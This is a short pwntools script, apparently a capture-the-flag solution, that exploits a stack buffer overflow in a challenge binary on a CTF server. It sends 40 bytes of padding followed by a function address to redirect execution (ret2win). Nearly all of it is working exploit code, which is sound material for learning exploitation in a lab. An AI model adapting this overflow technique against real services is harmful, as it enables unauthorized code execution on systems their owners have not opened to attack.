#!/usr/bin/env nix-shell
#!nix-shell -i python3 -p python3 python3Packages.pwntools

from pwnlib.util.packing import *
from pwn import *

pad = b'\x41' * 40

# Address of `detour` function
sol = p64(0x401156)

#con = process('./le_ruisseau_public')
con = remote("challenges.unitedctf.ca", 17001)

print(con.recvline())
print((pad+sol).hex())
con.sendline(pad + sol)
res = con.recvallb()
print(res)
con.wait_for_close()

